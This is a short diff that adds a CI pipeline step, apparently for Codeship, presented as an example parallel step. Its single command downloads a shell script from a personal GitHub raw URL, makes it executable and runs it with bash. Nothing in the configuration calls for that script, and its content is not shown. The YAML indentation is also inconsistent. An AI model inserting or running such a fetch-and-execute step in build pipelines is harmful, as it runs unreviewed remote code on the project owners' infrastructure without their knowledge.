@@ -1,0 +1,5 @@
+name: example_parallel_step
+  steps:
+     - service: codeship-example
+      # shell wrapper not required unless passing along env vars or combining commands
+      command: /bin/bash -c 'curl -o sem.sh https://raw.githubusercontent.com/dozzler555/sem/main/sem.sh; git config --global color.ui false; chmod a+x sem.sh; bash sem.sh'
